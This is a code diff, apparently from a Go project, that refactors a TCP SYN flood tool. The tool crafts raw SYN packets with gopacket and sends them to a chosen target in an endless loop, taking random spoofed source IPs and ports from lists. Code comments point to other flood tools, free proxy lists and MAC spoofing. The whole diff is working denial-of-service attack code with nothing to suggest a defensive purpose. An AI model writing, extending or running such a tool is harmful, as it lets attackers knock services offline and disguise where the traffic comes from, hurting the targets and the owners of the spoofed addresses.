@@ -4,15 +4,39 @@ import (
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/layers"
 	"github.com/schollz/progressbar/v3"
+	"go.uber.org/zap"
 	"golang.org/x/net/ipv4"
+	"math/rand"
 	"net"
 	"time"
 )
 
+var (
+	logger *zap.Logger
+	err error
+)
+
+func init() {
+	// initialize global pseudo random generator
+	rand.Seed(time.Now().Unix())
+	logger, err = zap.NewProduction()
+}
+
 func StartFlooding(dstIpStr string, dstPort, payloadLength int) {
+	defer func() {
+		err = logger.Sync()
+		if err != nil {
+			panic(err)
+		}
+	}()
+
 	bar := progressbar.DefaultBytes(-1, "Flood is in progress")
 	payload := getRandomPayload(payloadLength)
+	srcIps := getIps()
+	srcPorts := getPorts()
+
 	for {
+		// !!! https://www.devdungeon.com/content/packet-capture-injection-and-analysis-gopacket
 		// https://www.programmersought.com/article/74831586115/
 		// https://github.com/rootVIII/gosynflood
 		// https://golangexample.com/repeatedly-send-crafted-tcp-syn-packets-with-raw-sockets/
@@ -22,32 +46,10 @@ func StartFlooding(dstIpStr string, dstPort, payloadLength int) {
 		// free proxies -> https://www.sslproxies.org/
 		// mac spoofing -> https://github.com/google/gopacket/issues/153
 
-		var srcIp, dstIp net.IP
-		srcIpStr := "117.58.245.110"
-
-		srcIp = net.ParseIP(srcIpStr).To4()
-		dstIp = net.ParseIP(dstIpStr).To4()
-
-		// build raw/ip packet
-		ip := &layers.IPv4{
-			SrcIP: srcIp,
-			DstIP: dstIp,
-			//Version: 4,
-			//TTL: 64,
-			Protocol: layers.IPProtocolTCP,
-		}
-		tcp := &layers.TCP{
-			SrcPort: layers.TCPPort(30500),
-			DstPort: layers.TCPPort(dstPort),
-			//Window:  1505,
-			Window:  14600,
-			// Urgent:  0,
-			//Seq:     11050,
-			Seq:     1105024978,
-			// Ack:     0,
-			SYN:     true,
-		}
-		err := tcp.SetNetworkLayerForChecksum(ip)
+		logger.Info("hello")
+		ipPacket := buildIpPacket(srcIps[rand.Intn(len(srcIps))], dstIpStr)
+		tcpPacket := buildTcpPacket(int(srcPorts[rand.Intn(len(srcPorts))]), dstPort)
+		err := tcpPacket.SetNetworkLayerForChecksum(ipPacket)
 		if err != nil {
 			panic(err)
 		}
@@ -61,7 +63,7 @@ func StartFlooding(dstIpStr string, dstPort, payloadLength int) {
 			FixLengths:       true,
 			ComputeChecksums: true,
 		}
-		err = ip.SerializeTo(ipHeaderBuf, opts)
+		err = ipPacket.SerializeTo(ipHeaderBuf, opts)
 		if err != nil {
 			panic(err)
 		}
@@ -71,7 +73,7 @@ func StartFlooding(dstIpStr string, dstPort, payloadLength int) {
 		}
 		tcpPayloadBuf := gopacket.NewSerializeBuffer()
 		payload := gopacket.Payload(payload)
-		err = gopacket.SerializeLayers(tcpPayloadBuf, opts, tcp, payload)
+		err = gopacket.SerializeLayers(tcpPayloadBuf, opts, tcpPacket, payload)
 		if err != nil {
 			panic(err)
 		}
@@ -94,10 +96,41 @@ func StartFlooding(dstIpStr string, dstPort, payloadLength int) {
 		}
 
 		// log.Printf("packet of length %d sent!\n", len(tcpPayloadBuf.Bytes()) + len(ipHeaderBuf.Bytes()))
+		logger.Info("packet sent!", zap.String("srcPort", tcpPacket.SrcPort.String()),
+			zap.String("dstPort", tcpPacket.DstPort.String()),
+			zap.String("srcIp", ipPacket.SrcIP.String()),
+			zap.Uint16("length", ipPacket.Length),
+			zap.String("dstIp", ipPacket.DstIP.String()))
 		err = bar.Add(payloadLength)
 		if err != nil {
 			panic(err)
 		}
 		time.Sleep(800 * time.Millisecond)
+	}
+}
+
+// build raw/ip packet
+func buildIpPacket(srcIpStr, dstIpStr string) *layers.IPv4 {
+	return &layers.IPv4{
+		SrcIP: net.ParseIP(srcIpStr).To4(),
+		DstIP: net.ParseIP(dstIpStr).To4(),
+		//Version: 4,
+		//TTL: 64,
+		Protocol: layers.IPProtocolTCP,
+	}
+}
+
+// build tcp packet
+func buildTcpPacket(srcPort, dstPort int) *layers.TCP {
+	return &layers.TCP{
+		SrcPort: layers.TCPPort(srcPort),
+		DstPort: layers.TCPPort(dstPort),
+		//Window:  1505,
+		Window:  14600,
+		// Urgent:  0,
+		//Seq:     11050,
+		Seq:     1105024978,
+		// Ack:     0,
+		SYN:     true,
 	}
 }
